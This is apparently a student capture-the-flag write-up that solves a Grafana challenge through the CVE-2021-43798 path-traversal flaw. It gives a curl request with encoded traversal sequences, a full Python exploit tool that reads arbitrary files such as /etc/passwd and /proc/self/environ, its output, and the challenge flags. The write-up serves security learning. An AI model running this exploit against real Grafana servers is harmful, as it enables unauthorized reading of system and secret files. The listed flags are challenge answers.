# Operation-Shadow-Trace
**FLAGS:**

Grafana blog:
```
PClub{Easy LFI}
PClub{4lw4ys_cl05e_y0ur_fil3s}
PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed}
```

Kalpit Rama blog:
```
flag1:PClub{idk_how_this_got_typed}
```
## Grafana Blog
### Initial challenge:
**FLAG:** ```PClub{Easy LFI}```  
 
When reading the grafana blog, opened the link to the grafana login dashboard. We didn't have the login id and password.  
 
When searched for grafana and its vulnerability found about the ```Grafana 8.3.0 - Directory Traversal and Arbitrary File Read, CVE:2021-43798```.  
There existed vulnerability that local files can be directly transversed.  

The detail of the exploit is found in this link: 
https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p  

Used this on terminal and found the flag in return, and the next IP and port of next two challenges.
```
curl http://13.126.50.182:3000/public/plugins/tempo/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag 
```
Returned data: 
```
PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

Also I saw a direct transversal code when going through google, link:  
https://www.exploit-db.com/exploits/50581  
To cross check all the other plugins, I ran it with necessary changes and got the same output on other plugins too.
```
#!/usr/bin/env python3
import requests
import random
import urllib3
urllib3.disable_warnings()
PLUGIN_LIST = [ "alertlist", "annolist", "barchart", "bargauge", "candlestick", "cloudwatch", "dashlist", "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource", "graph", "heatmap", "histogram", "influxdb", "jaeger", "logs", "loki", "mssql", "mysql", "news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres", "prometheus", "stackdriver", "stat", "state-timeline", "status-history", "table", "table-old", "tempo", "testdata", "text", "timeseries", "welcome", "zipkin" ]
TARGET = "http://13.126.50.182:3000"
SESSION = requests.Session()
HEADERS = { 'User-Agent': 'Mozilla/5.0' }
# Encoded traversal (12 levels deep)
TRAVERSAL = "%2E%2E%2F" * 12 # = ../../../../... (12 times)
def attempt_read(filepath):
   plugin = random.choice(PLUGIN_LIST)
   filepath_encoded =filepath.replace("/", "%2F")
   url = f"{TARGET}/public/plugins/{plugin}/{TRAVERSAL}{filepath_encoded}"
    print(f"🔎 Trying: {url}")
    try:
        res = SESSION.get(url, headers=HEADERS, verify=False, timeout=5)
        if res.status_code == 200 and "PClub{" in res.text:
            print(f"\n✅ FLAG FOUND at: {url}")
            print(res.text)
        elif res.status_code == 200:
            print(f"[+] File accessible — plugin '{plugin}' responded:")
            print(res.text[:300] + ("..." if len(res.text) > 300 else ""))
        elif "Found" in res.text and "/login" in res.text:
            print("🚫 Redirected to login. File may exist, but access is blocked.")
        else:
            print("[-] File not found or not readable.")
    except requests.exceptions.RequestException as e:         print(f"[!] Error accessing {url}: {e}")
def main():
    print("🎯 Grafana CVE-2021-43798 Exploit Tool — Operation Shadow Trace")
    print(f"🌐 Targeting: {TARGET}")
    print("📂 Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ\n")
    try:
        while True:
            filepath = input("📥 File to read: ").strip()
            if not filepath.startswith("/"):
                filepath = "/" + filepath
            attempt_read(filepath)
    except KeyboardInterrupt:
        print("\n👋 Exiting...")
if __name__ == "__main__":
    main()

... 
🎯 Grafana CVE-2021-43798 Exploit Tool — Operation Shadow Trace 🌐
Targeting: http://13.126.50.182:3000 📂
Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ
📥 File to read: /tmp/flag
🔎Trying: http://13.126.50.182:3000/public/plugins/opentsdb/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/opentsdb/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
🔎 Trying: http://13.126.50.182:3000/public/plugins/piechart/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/piechart/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
📥 File to read: /tmp/flag
🔎 Trying: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

